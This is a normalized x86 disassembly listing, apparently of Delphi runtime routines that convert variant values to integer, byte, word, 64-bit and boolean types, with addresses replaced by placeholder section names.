jmp r-xdata
mov eax ebx
call sub_410bf0
mov edx eax
mov eax esi
call sub_4134d8
jmp r-xdata
mov eax ebx
call sub_40ff80
mov edx eax
mov eax esi
call sub_4133c4
jmp r-xdata
mov eax ebx
call sub_410030
mov edx eax
mov eax esi
call sub_413364
jmp r-xdata
mov eax ebx
call sub_4101d0
mov edx eax
mov eax esi
call sub_413384
jmp r-xdata
mov eax ebx
call sub_4102a8
mov edx eax
mov eax esi
call sub_4133a4
jmp r-xdata
mov eax ebx
call sub_4105f4
push edx
push eax
mov eax esi
call sub_413404
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f5e8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f634
jmp r-xdata
mov dx 0x101
call sub_40e940
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f178
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f700
xor edx edx
mov ax 0x1
call sub_40e940
jmp r-xdata
sub_40f998
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fa3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412bb8
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4043ec
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_4084e0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa42
lea eax [ ebp - 0xc ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404844
retn
mov eax ebx
call sub_410bf0
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40edd4
jmp r-xdata
sub_40fa4c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40edd4
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fa88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fadc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f4a0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fb30
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fae3
lea eax [ ebp - 0x14 ]
call sub_40f178
retn
sub_40faec
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fb30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40ff51
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fb63 ]
mov eax [ ebp - 0x4 ]
call sub_40f998
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f998
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fb30
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa88
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e940
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40faec
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fa4c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fd87 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f998
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fb30
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4032a8
sub_40ff80
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e940
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41000c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb30
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032a8
sub_410030
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e940
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4100b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb30
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032a8
sub_4100d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push j_sub_403830
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb30
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4100fe ]
jmp [ eax * 4 + jump_table_410110 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032a8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e940
sub_4101d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_410285
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fb30
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4101f2 ]
jmp [ eax * 4 + jump_table_410205 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032a8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e940
sub_4102a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_41036d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4105f4
test edx edx
je r-xdata
mov al [ eax + lookup_table_4102ce ]
jmp [ eax * 4 + jump_table_4102e2 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4032a8
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e940
sub_410390
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402b1c
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40edd4
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410bf0
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41043c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41052a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412bb8
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4043ec
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408500
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410531
lea eax [ ebp - 0x1c ]
call sub_404164
lea eax [ ebp - 0xc ]
call sub_404844
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402b1c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40edd4
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410bf0
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41053c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410593
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f4a0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4105f4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41059a
lea eax [ ebp - 0x18 ]
call sub_40f178
retn
sub_4105a8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4105f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410a00
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410627 ]
mov eax [ ebp - 0x4 ]
call sub_41043c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41043c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4105f4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410390
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41053c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e940
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4105a8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410390
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410390
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41084b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402b1c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41043c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4105f4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410a38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410aef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412bb8
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4043ec
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4085ec
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410af6
lea eax [ ebp - 0x10 ]
call sub_404164
lea eax [ ebp - 0x8 ]
call sub_404844
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40edd4
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40edd4
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410b00
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40edd4
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410b40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410b94
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f4a0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410bf0
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b9b
lea eax [ ebp - 0x11 ]
call sub_40f178
retn
sub_410ba4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_41468c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
